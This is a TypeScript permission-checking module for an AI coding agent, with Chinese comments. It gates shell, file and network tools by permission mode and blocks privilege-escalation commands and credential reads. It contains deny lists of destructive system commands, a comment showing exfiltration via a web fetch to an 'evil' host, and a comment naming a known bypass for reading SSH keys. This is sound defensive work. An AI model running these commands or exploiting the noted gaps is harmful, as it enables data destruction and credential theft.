/**
 * Agent 权限服务。
 *
 * 安全边界由实际执行时的 OS 沙盒承担；本文件只做确定目标的提前判定、阻止提权类命令，
 * 并把不可伪造的执行策略交给工具包装层。命令中的消息、正则和脚本文本不再扫描成路径。
 */

import { ensureSandbox, isSandboxBypassedForMode } from "../sandbox/manager";
import { readCache } from "../session-cache";
import { parse as parseShell } from "shell-quote";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  canonicalPolicyPath,
  isStandardWritableTarget,
  pathHitsAny,
  protectedCredentialPaths,
  protectedTargetsForMode,
  type PermissionMode,
} from "./access-policy";
import { bindExecutionOwner, createExecutionContext, normalizePermissionMode, type ExecutionContext } from "./execution-context";

type PermissionBehavior = "allow" | "deny";
type PermissionUpdateDestination = "userSettings" | "projectSettings" | "localSettings" | "session" | "cliArg";
interface PermissionRuleValue { toolName: string; ruleContent?: string }
type PermissionUpdate = {
  type: "addRules" | "replaceRules" | "removeRules";
  rules: PermissionRuleValue[];
  behavior: PermissionBehavior;
  destination: PermissionUpdateDestination;
} | {
  type: "setMode";
  mode: string;
  destination: PermissionUpdateDestination;
} | {
  type: "addDirectories" | "removeDirectories";
  directories: string[];
  destination: PermissionUpdateDestination;
};
type PermissionDecisionClassification = "user_temporary" | "user_permanent" | "user_reject";

export type PermissionResult = {
  behavior: "allow";
  updatedInput?: Record<string, unknown>;
  executionPolicy?: ExecutionContext;
  updatedPermissions?: PermissionUpdate[];
  toolUseID?: string;
  decisionClassification?: PermissionDecisionClassification;
} | {
  behavior: "deny";
  message: string;
  interrupt?: boolean;
  toolUseID?: string;
  decisionClassification?: PermissionDecisionClassification;
};

export interface CanUseToolOptions {
  signal: AbortSignal;
  suggestions?: PermissionUpdate[];
  blockedPath?: string;
  decisionReason?: string;
  decisionReasonType?: string;
  classifierApprovable?: boolean;
  toolUseID: string;
  agentID?: string;
  title?: string;
  displayName?: string;
  description?: string;
}

export class AgentPermissionService {
  createCanUseTool(
    sessionId: string,
    cwd: string,
    resolveSessionId?: (sid: string) => string,
  ): (toolName: string, input: Record<string, unknown>, options: CanUseToolOptions) => Promise<PermissionResult> {
    return async (toolName, input) => {
      const sid = resolveSessionId ? resolveSessionId(sessionId) : sessionId;
      const mode = normalizeMode(readCache(sid)?.permissionMode || "auto");
      const allow = (executionPolicy?: ExecutionContext): PermissionResult => ({
        behavior: "allow",
        updatedInput: input,
        executionPolicy,
      });
      const deny = (rule: string, operation: string, target: string, detail: string): PermissionResult => ({
        behavior: "deny",
        message: [
          `操作被阻止：${detail}`,
          `模式：${permissionModeLabel(mode)}`,
          `操作：${operation}`,
          `目标：${target}`,
          `规则：${rule}`,
          "阶段：执行前",
        ].join("\n"),
      });

      const name = toolName.toLowerCase();
      const explicitPaths = extractExplicitPaths(input);

      // 只读档使用纯读白名单，未知工具默认拒绝；不能靠“新增危险工具时记得补黑名单”。
      // 高敏凭据仍禁止读取：工具结果会进入远程模型上下文，模型 API 本身就是外发通道。
      if (mode === "readonly") {
        const blocked = readonlyDenyReason(name);
        if (blocked) return deny("readonly.blocked", blocked.operation, name, blocked.detail);
        for (const requested of explicitPaths) {
          if (pathHitsAny(requested, protectedCredentialPaths(), cwd)) {
            return deny("core.credential_read", "read", requested, "只读模式也不读取高度敏感凭据（内容会进入模型上下文）");
          }
        }
        return allow();
      }

      if (isReadTool(name)) {
        // 高敏凭据的**读**检查只在标准模式生效（2026-09-16 用户口径：完全访问除系统核心与
        // 危险操作外全放开）。此前完全访问也拦，导致 `read ~/.ssh/id_rsa` 被拒、而 shell 里
        // `cat` 却能读——同一文件两套口径，属于不一致，已随本次改动统一。
        if (mode !== "full") {
          for (const requested of explicitPaths) {
            if (pathHitsAny(requested, protectedCredentialPaths(), cwd)) {
              return deny("core.credential_read", "read", requested, "读取高度敏感凭据（标准模式限制，切完全访问可放开）");
            }
          }
        }
        return allow();
      }

      if (isWriteTool(name)) {
        const protectedTargets = protectedTargetsForMode(mode, cwd);
        for (const requested of explicitPaths) {
          const target = canonicalPolicyPath(requested, cwd);
          if (pathHitsAny(target, protectedTargets, cwd)) {
            return deny("core.protected_write", "write", target, "修改系统核心、原始设备或持久化执行配置（完全访问也不允许）");
          }
          if (mode !== "full" && !isStandardWritableTarget(cwd, target)) {
            return deny("standard.write_scope", "write", target, "写入工作区外文件");
          }
        }
        return allow();
      }

      if (name === "install_dependency") {
        if (!isSandboxBypassedForMode(mode)) {
          const sandbox = await ensureSandbox(cwd, mode);
          if (!sandbox.ok) {
            return deny("backend.sandbox_unavailable", "execute", "install_dependency", `安全执行后端不可用：${sandbox.reason}`);
          }
        }
        return allow(bindExecutionOwner(createExecutionContext(cwd, mode), sid));
      }

      if (isShellTool(name)) {
        const command = String(input.command || "");
        if (!command.trim()) return allow();
        if (isSystemMutationCommand(command)) {
          return deny("core.privileged_operation", "execute", firstCommand(command), "执行提权或系统控制命令（完全访问也不允许）");
        }
        const unsafeScript = findUnsafeExecutedScript(command, cwd);
        if (unsafeScript) {
          return deny("core.privileged_operation", "execute", unsafeScript, "执行包含提权或系统控制命令的本地脚本（完全访问也不允许）");
        }
        // 标准 / 只读档的强制力来自**内核沙盒**（见 sandbox/manager.isSandboxEnabledForMode）；
        // 下面三条线是**纵深**：给出更早、更可读的拒绝理由，并接住完全访问档（那里没有内核兜底）。
        // 三条线各对应沙盒原来扛的一件事：
        // ① 保护面（原 denyWrite/allowWrite 的禁区）② 标准模式的区外写（原 allowWrite 的白名单）
        // ③ 标准模式的凭据读（原 denyRead）。都是启发式，边界见各函数注释。
        const protectedTarget = findProtectedWriteTarget(command, cwd, mode);
        if (protectedTarget) {
          return deny("core.protected_write", "write", protectedTarget, "写入系统核心、原始设备或持久化执行配置（不可放开）");
        }
        const outOfScope = mode !== "full" ? findOutOfScopeWriteTarget(command, cwd) : null;
        if (outOfScope) {
          return deny("standard.write_scope", "write", outOfScope, "写入工作区与开发运行区之外（切完全访问可放开）");
        }
        const secretRead = mode !== "full" ? findProtectedReadTarget(command, cwd) : null;
        if (secretRead) {
          return deny("core.credential_read", "read", secretRead, "读取高度敏感凭据（标准模式限制，切完全访问可放开）");
        }
        if (!isSandboxBypassedForMode(mode)) {
          const sandbox = await ensureSandbox(cwd, mode);
          if (!sandbox.ok) {
            return deny("backend.sandbox_unavailable", "execute", firstCommand(command), `安全执行后端不可用：${sandbox.reason}`);
          }
        }
        return allow(bindExecutionOwner(createExecutionContext(cwd, mode), sid));
      }

      if ((name.startsWith("mcp__") || name === "read_mcp_resource") && explicitPaths.length > 0) {
        const writeLike = /(?:write|edit|create|delete|remove|move|copy|upload|update|patch|save)/.test(name);
        const readLike = /(?:read|get|list|search|find|fetch|download)/.test(name);
        const protectedTargets = protectedTargetsForMode(mode, cwd);
        for (const requested of explicitPaths) {
          const target = canonicalPolicyPath(requested, cwd);
          if (readLike && mode !== "full" && pathHitsAny(target, protectedCredentialPaths(), cwd)) {
            return deny("core.credential_read", "read", target, "读取高度敏感凭据（标准模式限制，切完全访问可放开）");
          }
          if (writeLike && pathHitsAny(target, protectedTargets, cwd)) {
            return deny("core.protected_write", "write", target, "修改系统核心、原始设备或持久化执行配置（完全访问也不允许）");
          }
          if (writeLike && mode !== "full" && !isStandardWritableTarget(cwd, target)) {
            return deny("standard.write_scope", "write", target, "写入工作区外文件");
          }
        }
      }
      return allow();
    };
  }
}

export const permissionService = new AgentPermissionService();

const normalizeMode = normalizePermissionMode;

/** 权限模式的中文名（拒绝消息里要显示人话）。 */
export function permissionModeLabel(mode: PermissionMode): string {
  if (mode === "full") return "完全访问";
  if (mode === "readonly") return "只读";
  return "标准";
}

function isReadTool(name: string): boolean {
  return name === "read" || name === "grep" || name === "find" || name === "ls" || name === "glob";
}

function isWriteTool(name: string): boolean {
  return name === "write" || name === "edit" || name === "notebookedit";
}

function isShellTool(name: string): boolean {
  return name === "bash" || name === "powershell";
}

/**
 * **联网类工具名**：它们不写文件、不跑 shell，但**能发请求 ⇒ 就是一条外泄出口**。
 * 只读档必须挡掉它们，否则「读自由」会被 `web_fetch("https://evil/?x=" + 刚读到的内容)` 绕过，
 * 整档的安全保证被抵消。（`mcp__*` 同理，另行拦。）
 */
const READONLY_ALLOWED_TOOLS = new Set([
  // 这些工具只走 Node 文件系统 API。grep / find / glob 在 Pi SDK 中可能按需下载 rg / fd，
  // 不属于只读档可承诺的无写入、无联网路径。
  "read", "ls",
  // EasyMint 自身的纯查询工具；它们不启动进程、不写持久状态、不访问网络。
  "list_issues", "list_agents", "read_agent_log", "search_experiences", "ask_user",
  // 子 Agent 结构化返回工具；只在已存在的只读 worker 中出现。
  "yield",
]);

/**
 * 只读档的纯读白名单。返回 `null` = 明确允许；任何未知工具都 fail-closed。
 * 这样新增工具必须先完成能力审查才可能进入只读档，不会因漏登记而静默获得写入/联网能力。
 */
export function readonlyDenyReason(toolName: string): { operation: string; detail: string } | null {
  const name = toolName.toLowerCase();
  if (name.startsWith("mcp__")) return { operation: "execute", detail: "只读档不启用 MCP 工具（会启动进程或联网）" };
  if (READONLY_ALLOWED_TOOLS.has(name)) return null;
  if (isShellTool(name) || name === "install_dependency" || name === "task" || name === "stop_shell" || name === "stop_agent") {
    return { operation: "execute", detail: "只读档不执行命令、启动子代理或控制进程" };
  }
  if (isWriteTool(name) || /(?:write|edit|create|delete|remove|update|set_|import|manage|learn|retire)/.test(name)) {
    return { operation: "write", detail: "只读档不写入文件或修改应用状态" };
  }
  if (/(?:web|fetch|search|download|upload|describe_image)/.test(name)) {
    return { operation: "network", detail: "只读档不调用可能联网或上传内容的工具" };
  }
  return { operation: "execute", detail: "该工具未声明为纯读能力，只读档默认拒绝" };
}

function extractExplicitPaths(input: Record<string, unknown>): string[] {
  const keys = new Set(["file_path", "notebook_path", "path", "directory", "dir", "destination", "dest", "target", "source", "src", "file"]);
  const result: string[] = [];
  for (const [key, value] of Object.entries(input)) {
    const k = key.toLowerCase();
    if (k === "uri" && typeof value === "string" && value.startsWith("file:")) {
      try { result.push(fileURLToPath(value)); } catch { /* malformed URI is validated by the tool */ }
    }
    if (!keys.has(k) && !k.endsWith("_path")) continue;
    if (typeof value === "string" && value.trim()) result.push(value);
    if (Array.isArray(value)) {
      for (const item of value) if (typeof item === "string" && item.trim()) result.push(item);
    }
  }
  return [...new Set(result)];
}

function firstCommand(command: string): string {
  return command.trim().split(/\s+/)[0]?.slice(0, 100) || "shell";
}

/** 明确的提权、磁盘和系统服务控制命令；文件路径保护由运行时沙盒完成。 */
export function isSystemMutationCommand(command: string): boolean {
  const alwaysMutating = new Set([
    "sudo", "su", "doas", "dd", "mkfs", "umount", "fdisk", "parted",
    "shutdown", "reboot", "halt", "poweroff",
    "csrutil", "nvram", "diskpart", "format", "bcdedit", "netsh",
    "set-executionpolicy", "format-volume", "clear-disk", "initialize-disk",
    "set-service", "start-service", "stop-service", "restart-service", "suspend-service", "resume-service", "new-service", "remove-service",
    "stop-computer", "restart-computer",
    // Windows PowerShell 直接暴露系统控制面，文件 ACL 不会覆盖注册表/服务管理。
    "set-itemproperty", "new-itemproperty", "remove-itemproperty", "set-mppreference", "regedit",
    "add-windowscapability", "remove-windowscapability", "enable-windowsoptionalfeature",
    "disable-windowsoptionalfeature", "install-windowsfeature", "uninstall-windowsfeature",
    // macOS 安全机制 / 固件 / 内核 / 防火墙（2026-09-16 补：完全访问不再有沙盒兜底，
    // 这批"关闭安全机制"的动作此前不在名单里，属危险操作缺口）
    "fdesetup", "systemsetup", "kextload", "kextunload", "pfctl", "socketfilterfw", "bless",
  ]);
  const mutatingSubcommands: Record<string, Set<string>> = {
    launchctl: new Set(["bootstrap", "bootout", "enable", "disable", "kickstart", "kill", "load", "remove", "setenv", "start", "stop", "submit", "unload", "unsetenv"]),
    systemctl: new Set(["add-wants", "cancel", "daemon-reexec", "daemon-reload", "disable", "edit", "enable", "halt", "hibernate", "isolate", "kill", "link", "mask", "preset", "reboot", "reenable", "reload", "restart", "revert", "set-default", "start", "stop", "suspend", "switch-root", "unmask"]),
    service: new Set(["start", "stop", "restart", "reload", "force-reload"]),
    sc: new Set(["config", "create", "delete", "failure", "start", "stop", "pause", "continue"]),
    reg: new Set(["add", "delete", "import", "load", "unload", "restore", "copy"]),
    schtasks: new Set(["/change", "/create", "/delete", "/end", "/run"]),
    diskutil: new Set(["apfs", "corestorage", "eject", "eraseDisk", "eraseVolume", "mount", "mountDisk", "partitionDisk", "randomDisk", "rename", "repairDisk", "repairVolume", "resetFusion", "unmount", "unmountDisk", "zeroDisk"].map((v) => v.toLowerCase())),
    // 关闭/改写安全机制与系统更新（只拦变更类参数，`spctl --status` 之类查询仍放行）
    spctl: new Set(["--master-disable", "--global-disable", "--disable", "--enable", "--add", "--remove"]),
    softwareupdate: new Set(["-i", "--install", "-a", "--all", "--schedule", "--clear-catalog"]),
  };
  // 命令替换会在普通命令的参数求值阶段执行。shell-quote 会把双引号中的 $(...) 当成
  // 一个字符串，因此先单独提取真实会执行的子命令；单引号内的同样文本不会被提取。
  if (extractCommandSubstitutions(command).some((nested) => isSystemMutationCommand(nested))) return true;

  return splitTopLevelShellLines(command).some((segment) => inspectShellCommand(segment, alwaysMutating, mutatingSubcommands));
}

function inspectShellCommand(
  command: string,
  alwaysMutating: ReadonlySet<string>,
  mutatingSubcommands: Readonly<Record<string, ReadonlySet<string>>>,
): boolean {
  let parsed: ReturnType<typeof parseShell>;
  try {
    // shell-quote 保留控制运算符，并把引号内的 `;`、`|` 等留在普通参数中。
    // 因此提交说明、正则和 echo 文本不会再被误当成另一条命令。
    parsed = parseShell(command);
  } catch {
    // 语法错误交给真实 shell 报告；不能因为权限层猜测而制造一次误拦。
    return false;
  }

  const commandSeparators = new Set(["&&", "||", ";", ";;", "|", "|&", "&", "(", ")", "<("]);
  const redirections = new Set(["<", ">", ">>", ">&", "<&", "<<<"]);
  const reservedPrefixes = new Set(["if", "then", "elif", "else", "while", "until", "do", "time", "!", "{"]);
  let words: string[] = [];
  const inspect = (): boolean => {
    if (words.length === 0) return false;
    let index = 0;
    while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index] || "")) index++;
    while (reservedPrefixes.has(commandBasename(words[index] || ""))) index++;

    // 跟进真正会执行后续 argv 的包装器；普通命令的其余参数一律视为数据。
    while (index < words.length) {
      const wrapper = commandBasename(words[index] || "");
      if (!["command", "exec", "nohup", "env", "xcrun", "nice"].includes(wrapper)) break;
      index++;
      while (words[index]?.startsWith("-")) index++;
      if (wrapper === "env") while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index] || "")) index++;
    }

    const token = commandBasename(words[index] || "");
    if (!token) return false;
    if (alwaysMutating.has(token)) return true;
    if (token === "mount") return words.length > index + 1;
    const verbs = mutatingSubcommands[token];
    if (verbs?.has((words[index + 1] || "").toLowerCase())) return true;

    // `sh -c` / `bash -c` / `eval` 的参数确实会作为 shell 程序执行，需要递归检查。
    if (["sh", "bash", "zsh", "dash", "ksh"].includes(token)) {
      const commandIndex = words.findIndex((word, i) => i > index && word === "-c");
      const nestedCommand = commandIndex >= 0 ? words[commandIndex + 1] : undefined;
      if (nestedCommand) return isSystemMutationCommand(nestedCommand);
    }
    if (token === "cmd") {
      const commandIndex = words.findIndex((word, i) => i > index && ["/c", "/k"].includes(word.toLowerCase()));
      if (commandIndex >= 0 && words[commandIndex + 1]) {
        return isSystemMutationCommand(words.slice(commandIndex + 1).join(" "));
      }
    }
    if (["powershell", "pwsh"].includes(token)) {
      const encoded = words.some((word, i) => i > index && ["-encodedcommand", "-enc", "-e"].includes(word.toLowerCase()));
      if (encoded) return true; // 编码脚本无法可靠审查，系统控制保护按 fail-closed 处理。
      const commandIndex = words.findIndex((word, i) => i > index && ["-command", "-c"].includes(word.toLowerCase()));
      if (commandIndex >= 0 && words[commandIndex + 1]) {
        return isSystemMutationCommand(words.slice(commandIndex + 1).join(" "));
      }
    }
    if (token === "eval" && words[index + 1]) return isSystemMutationCommand(words.slice(index + 1).join(" "));
    return false;
  };

  for (const entry of parsed) {
    if (typeof entry === "string") {
      words.push(entry);
      continue;
    }
    if ("comment" in entry) break;
    if (!("op" in entry) || typeof entry.op !== "string") continue;
    if (redirections.has(entry.op)) continue;
    if (!commandSeparators.has(entry.op)) continue;
    if (inspect()) return true;
    words = [];
  }
  return inspect();
}

/**
 * 抽取真正会被 shell 执行的 $(...) 和反引号内容。单引号中的字符只是数据；双引号内的
 * 命令替换依然会执行，必须检查。解析失败时宁可跳过该段并让 OS 沙盒成为最终边界。
 */
function extractCommandSubstitutions(source: string): string[] {
  const result: string[] = [];
  let quote: "single" | "double" | null = null;
  let pendingHeredocs: Array<{ delimiter: string; quoted: boolean; stripTabs: boolean }> = [];
  let activeHeredocs: Array<{ delimiter: string; quoted: boolean; stripTabs: boolean }> = [];
  for (let i = 0; i < source.length; i++) {
    const char = source[i]!;
    if (activeHeredocs.length > 0) {
      const lineEnd = source.indexOf("\n", i);
      const end = lineEnd < 0 ? source.length : lineEnd;
      const line = source.slice(i, end);
      const heredoc = activeHeredocs[0]!;
      const candidate = heredoc.stripTabs ? line.replace(/^\t+/, "") : line;
      if (candidate === heredoc.delimiter) activeHeredocs.shift();
      else if (!heredoc.quoted) result.push(...extractCommandSubstitutions(line));
      i = end;
      continue;
    }
    if (char === "\\" && quote !== "single") { i++; continue; }
    if (char === "'" && quote !== "double") { quote = quote === "single" ? null : "single"; continue; }
    if (char === '"' && quote !== "single") { quote = quote === "double" ? null : "double"; continue; }
    if (quote === "single") continue;

    if (!quote && char === "#" && (i === 0 || /[\s;|&()]/.test(source[i - 1]!))) {
      const newline = source.indexOf("\n", i);
      i = newline < 0 ? source.length : newline;
      continue;
    }
    if (!quote && char === "<" && source[i + 1] === "<") {
      const heredoc = /^(<<-?)\s*(?:'([^']+)'|"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))/.exec(source.slice(i));
      if (heredoc) {
        pendingHeredocs.push({
          delimiter: heredoc[2] ?? heredoc[3] ?? heredoc[4]!,
          quoted: !!(heredoc[2] ?? heredoc[3]),
          stripTabs: heredoc[1] === "<<-",
        });
      }
    }
    if (!quote && char === "\n" && pendingHeredocs.length > 0) {
      activeHeredocs = pendingHeredocs;
      pendingHeredocs = [];
      continue;
    }

    if (char === "$" && source[i + 1] === "(") {
      const extracted = readParenthesizedSubcommand(source, i + 2);
      if (extracted) {
        result.push(extracted.content);
        i = extracted.end;
      }
      continue;
    }
    if (char === "`") {
      const extracted = readBacktickSubcommand(source, i + 1);
      if (extracted) {
        result.push(extracted.content);
        i = extracted.end;
      }
    }
  }
  return result;
}

function readParenthesizedSubcommand(source: string, start: number): { content: string; end: number } | null {
  let depth = 1;
  let quote: "single" | "double" | null = null;
  for (let i = start; i < source.length; i++) {
    const char = source[i]!;
    if (char === "\\" && quote !== "single") { i++; continue; }
    if (char === "'" && quote !== "double") { quote = quote === "single" ? null : "single"; continue; }
    if (char === '"' && quote !== "single") { quote = quote === "double" ? null : "double"; continue; }
    if (quote) continue;
    if (char === "(") depth++;
    if (char === ")" && --depth === 0) return { content: source.slice(start, i), end: i };
  }
  return null;
}

function readBacktickSubcommand(source: string, start: number): { content: string; end: number } | null {
  for (let i = start; i < source.length; i++) {
    if (source[i] === "\\") { i++; continue; }
    if (source[i] === "`") return { content: source.slice(start, i), end: i };
  }
  return null;
}

/**
 * shell-quote 不把换行视为控制符。这里仅分割未引用的顶层换行，并跳过 heredoc 正文，
 * 因而既能发现多行脚本中的真实命令，也不会把 heredoc、提交说明或多行字符串误判为命令。
 */
function splitTopLevelShellLines(source: string): string[] {
  const result: string[] = [];
  let current = "";
  let quote: "single" | "double" | null = null;
  let pendingHeredocs: string[] = [];
  let activeHeredocs: string[] = [];
  let heredocLine = "";

  const commit = (): void => {
    if (current.trim()) result.push(current);
    current = "";
  };

  for (let i = 0; i < source.length; i++) {
    const char = source[i]!;
    if (activeHeredocs.length > 0) {
      if (char !== "\n") { heredocLine += char; continue; }
      const expected = activeHeredocs[0]!;
      if (heredocLine.replace(/^\t+/, "") === expected) activeHeredocs.shift();
      heredocLine = "";
      continue;
    }
    if (char === "\\" && quote !== "single") {
      current += char + (source[i + 1] ?? "");
      i++;
      continue;
    }
    if (char === "'" && quote !== "double") { quote = quote === "single" ? null : "single"; current += char; continue; }
    if (char === '"' && quote !== "single") { quote = quote === "double" ? null : "double"; current += char; continue; }
    if (!quote && char === "<" && source[i + 1] === "<") {
      const heredoc = /^<<-?\s*(?:'([^']+)'|"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))/.exec(source.slice(i));
      if (heredoc) pendingHeredocs.push(heredoc[1] ?? heredoc[2] ?? heredoc[3]!);
    }
    if (!quote && char === "\n") {
      commit();
      if (pendingHeredocs.length > 0) {
        activeHeredocs = pendingHeredocs;
        pendingHeredocs = [];
      }
      continue;
    }
    current += char;
  }
  commit();
  return result;
}

function commandBasename(token: string): string {
  const basename = token.replace(/^['"]|['"]$/g, "").replace(/\\/g, "/").split("/").pop()?.toLowerCase() || "";
  return basename.replace(/\.(?:exe|cmd|bat|com)$/i, "");
}

/** 只检查真实作为命令参数执行的本地脚本；引号中的 echo/提交信息不会成为命令首词。 */
function findUnsafeExecutedScript(command: string, cwd: string): string | null {
  let parsed: ReturnType<typeof parseShell>;
  try { parsed = parseShell(command); } catch { return null; }
  const separators = new Set(["&&", "||", ";", ";;", "|", "|&", "&"]);
  let words: string[] = [];
  const inspect = (): string | null => {
    if (words.length === 0) return null;
    let index = 0;
    while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index] || "")) index++;
    while (["command", "exec", "nohup", "env", "nice"].includes(commandBasename(words[index] || ""))) {
      const wrapper = commandBasename(words[index++] || "");
      while (words[index]?.startsWith("-")) index++;
      if (wrapper === "env") while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index] || "")) index++;
    }
    const token = commandBasename(words[index] || "");
    let candidate: string | undefined;
    if (["powershell", "pwsh"].includes(token)) {
      const fileIndex = words.findIndex((word, i) => i > index && ["-file", "-f"].includes(word.toLowerCase()));
      candidate = fileIndex >= 0 ? words[fileIndex + 1] : undefined;
    } else if (["sh", "bash", "zsh", "dash", "ksh"].includes(token)) {
      candidate = words.slice(index + 1).find((word) => !word.startsWith("-"));
    } else if ((words[index] || "").startsWith("./") || (words[index] || "").startsWith(".\\")) {
      candidate = words[index];
    }
    if (!candidate || /[\0\r\n]/.test(candidate)) return null;
    const absolute = path.isAbsolute(candidate) ? candidate : path.resolve(cwd, candidate);
    try {
      const stat = fs.lstatSync(absolute);
      if (!stat.isFile() || stat.isSymbolicLink() || stat.size > 200 * 1024) return null;
      return isSystemMutationCommand(fs.readFileSync(absolute, "utf8")) ? candidate : null;
    } catch { return null; }
  };
  for (const entry of parsed) {
    if (typeof entry === "string") { words.push(entry); continue; }
    if ("comment" in entry) break;
    if (!("op" in entry) || !separators.has(entry.op)) continue;
    const hit = inspect();
    if (hit) return hit;
    words = [];
  }
  return inspect();
}

/** 参数即目标（可多个）的写入类命令 */
const WRITE_ALL_ARG_COMMANDS = new Set([
  "rm", "rmdir", "unlink", "shred", "truncate", "touch", "mkdir",
  "chmod", "chown", "chgrp", "chflags", "tee", "setfacl",
]);
/** 末位参数是写入目标、前面参数是读取来源的命令 */
const WRITE_LAST_ARG_COMMANDS = new Set(["cp", "mv", "install", "ln", "rsync", "scp"]);
/** 参数即读取来源的命令（用来接住"读凭据"这条原来由沙盒 denyRead 扛的线） */
const READ_ALL_ARG_COMMANDS = new Set([
  "cat", "less", "more", "head", "tail", "strings", "xxd", "od", "base64",
  "wc", "sort", "uniq", "md5", "md5sum", "shasum", "cksum", "file", "stat",
  "grep", "rg", "ag", "awk", "sed", "perl", "diff", "du", "ls", "find", "tar", "zip", "ditto",
]);

interface CommandTargets {
  reads: string[];
  writes: string[];
}

/**
 * 从一条 shell 命令里收集**显式的**读/写目标（启发式）。
 *
 * 认：写重定向（`>` `>>` `2>` `&>`）、写/读类命令的位置参数、`dd of=|if=`、`sed|perl -i` 的目标文件。
 * 不认：变量与命令替换（`> $F`、`tee $(…)`）、脚本文件内部的读写——后者只能靠
 * `findUnsafeExecutedScript` 的脚本内容扫描兜一层。解析失败按"无目标"处理（放行交给下一层）。
 */
function collectCommandTargets(command: string): CommandTargets {
  const result: CommandTargets = { reads: [], writes: [] };
  let parsed: ReturnType<typeof parseShell>;
  try { parsed = parseShell(command); } catch { return result; }

  const separators = new Set(["&&", "||", ";", ";;", "|", "|&", "&", "(", ")", "<("]);
  let words: string[] = [];
  let redirect: "read" | "write" | null = null;

  const flush = (): void => {
    if (words.length > 0) {
      let index = 0;
      while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index] || "")) index++;
      while (["command", "exec", "nohup", "env", "xcrun", "nice"].includes(commandBasename(words[index] || ""))) {
        const wrapper = commandBasename(words[index++] || "");
        while (words[index]?.startsWith("-")) index++;
        if (wrapper === "env") while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index] || "")) index++;
      }
      const token = commandBasename(words[index] || "");
      const rawArgs = words.slice(index + 1);
      const args = rawArgs.filter((arg) => !arg.startsWith("-"));
      if (token === "dd") {
        for (const arg of rawArgs) {
          if (arg.startsWith("of=")) result.writes.push(arg.slice(3));
          if (arg.startsWith("if=")) result.reads.push(arg.slice(3));
        }
      } else if (WRITE_ALL_ARG_COMMANDS.has(token)) {
        result.writes.push(...args);
      } else if (WRITE_LAST_ARG_COMMANDS.has(token)) {
        result.reads.push(...args.slice(0, -1));
        const last = args[args.length - 1];
        if (last) result.writes.push(last);
      } else if (READ_ALL_ARG_COMMANDS.has(token)) {
        const inPlace = (token === "sed" || token === "perl") && rawArgs.some((arg) => /^-i/.test(arg));
        if (inPlace && args.length > 0) {
          result.reads.push(...args.slice(0, -1));
          result.writes.push(args[args.length - 1]!);
        } else {
          result.reads.push(...args);
        }
      }
    }
    words = [];
  };

  for (const entry of parsed) {
    if (typeof entry === "string") {
      if (redirect === "write") { redirect = null; result.writes.push(entry); continue; }
      if (redirect === "read") { redirect = null; result.reads.push(entry); continue; }
      words.push(entry);
      continue;
    }
    if ("comment" in entry) break;
    if (!("op" in entry) || typeof entry.op !== "string") continue;
    if (entry.op.includes(">")) { redirect = "write"; continue; }
    if (entry.op.includes("<") && !entry.op.includes("<(")) { redirect = "read"; continue; }
    if (!separators.has(entry.op)) continue;
    flush();
  }
  flush();
  return result;
}

function cleanTarget(raw: string): string | null {
  const token = raw.replace(/^['"]|['"]$/g, "");
  return token && !token.startsWith("-") ? token : null;
}

/**
 * 命中**保护面**（系统核心 / 原始设备 / 持久化执行配置；标准模式另含凭据与 EasyMint 状态）的写目标。
 * 保护面按模式取，见 `protectedTargetsForMode`。
 */
export function findProtectedWriteTarget(command: string, cwd: string, mode: PermissionMode = "standard"): string | null {
  const { writes } = collectCommandTargets(command);
  const protectedRoots = protectedTargetsForMode(mode, cwd);
  const home = os.homedir();
  for (const raw of writes) {
    const token = cleanTarget(raw);
    if (!token) continue;
    const absolute = canonicalPolicyPath(token, cwd);
    // 根目录与 home 本身不算"保护面的子路径"，但整棵删除同样是灾难，单独拦
    if (absolute === "/" || absolute === home) return absolute;
    if (pathHitsAny(absolute, protectedRoots, cwd)) return absolute;
  }
  return null;
}

/**
 * 标准模式下**越界**的写目标（原由沙盒的 allowWrite「只放工作区与运行区」承担）。
 * 设备文件不算越界（`> /dev/null` 是最常见的一条；裸设备已由保护面先拦）。
 */
export function findOutOfScopeWriteTarget(command: string, cwd: string): string | null {
  const { writes } = collectCommandTargets(command);
  for (const raw of writes) {
    const token = cleanTarget(raw);
    if (!token) continue;
    const absolute = canonicalPolicyPath(token, cwd);
    if (absolute === "/dev" || absolute.startsWith("/dev/")) continue;
    if (!isStandardWritableTarget(cwd, absolute)) return absolute;
  }
  return null;
}

/**
 * 标准模式下读取**高敏凭据**的目标（原由沙盒的 denyRead 承担）。
 *
 * 只判定"看起来是路径"的参数（`/`、`~`、`./`、`../` 开头）——读命令的模式/表达式参数
 * （`sed 's/a/b/'`、`grep 'x'`）不该走路径判定。
 * 已知缺口：`cd ~ && cat .ssh/id_rsa` 这类**相对路径**不判（凭据都在 home，cwd 在项目内时碰不到；
 * 只有先 cd 出去才可能，属启发式的固有边界）。
 */
export function findProtectedReadTarget(command: string, cwd: string): string | null {
  const { reads } = collectCommandTargets(command);
  const credentials = protectedCredentialPaths();
  for (const raw of reads) {
    const token = cleanTarget(raw);
    if (!token || !/^(?:\/|~|\.\.?\/)/.test(token)) continue;
    const absolute = canonicalPolicyPath(token, cwd);
    if (pathHitsAny(absolute, credentials, cwd)) return absolute;
  }
  return null;
}
